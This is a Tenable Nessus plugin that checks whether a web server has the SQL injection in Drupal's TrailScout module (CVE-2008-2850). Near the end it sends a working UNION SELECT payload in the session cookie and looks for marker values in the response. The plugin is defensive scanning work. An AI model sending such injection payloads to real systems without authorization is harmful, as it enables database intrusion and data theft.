#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(33274);
  script_version("$Revision: 1.24 $");
  script_cvs_date("$Date: 2017/05/16 19:35:39 $");

  script_cve_id("CVE-2008-2850");
  script_bugtraq_id(29807);
  script_osvdb_id(46431);

  script_name(english:"TrailScout Module For Drupal Session Cookie SQL Injection");
  script_summary(english:"Attempts to inject SQL statements into the session cookie.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a SQL
injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running TrailScout, a third-party module for Drupal
that displays a breadcrumb-like trail showing pages a user recently
visited on a site.

The version of the TrailScout module installed on the remote host
fails to sanitize user-supplied input to the session cookie before
using it in database queries. Regardless of PHP's 'magic_quotes_gpc'
setting, an attacker can exploit this issue to manipulate database
queries, leading to the disclosure of sensitive information,
modification of data, or attacks against the underlying database.");
  script_set_attribute(attribute:"see_also", value:"https://www.drupal.org/node/272191");
  script_set_attribute(attribute:"solution", value:"Upgrade to TrailScout version 5.x-1.4.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(89);

  script_set_attribute(attribute:"vuln_publication_date", value:"2008/06/18");
  script_set_attribute(attribute:"patch_publication_date", value:"2008/06/18");
  script_set_attribute(attribute:"plugin_publication_date", value:"2008/06/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:drupal:drupal");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:drupal:trailscout_module");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2017 Tenable Network Security, Inc.");
  script_dependencies("drupal_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Drupal", "www/PHP");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Drupal";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(qs:dir, port:port);

clear_cookiejar();
res = http_send_recv3(
  method  : "GET",
  item    : dir + "/",
  port    : port,
  exit_on_fail : TRUE
);

# If we see the cookie ...
if ("Set-Cookie:" >< res[1])
{
  # Use the cookie name and exploit the cookie value.
  magic1 = unixtime();
  magic2 = rand();
  exploit = "foo' UNION SELECT "+magic1+','+magic2+" #";

  replace_http_cookies(new_value: exploit);

  r = http_send_recv3(method: 'GET', item:dir+"/", port:port, exit_on_fail:TRUE);

  line = egrep(pattern:'<a href="/'+magic1+'" title="', string:r[2]);
  if (line)
  {
    output = strstr(r[2], line);
    security_report_v4(
      port       : port,
      severity   : SECURITY_HOLE,
      generic    : TRUE,
      line_limit : 5,
      sqli       : TRUE,  # Sets SQLInjection KB key
      request    : make_list(http_last_sent_request()),
      output     : chomp(output)
    );
  }
  else
  {
    audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
  }
}
else
{
  exit(0, "The web server on port "+port+" did not send a cookie.");
}
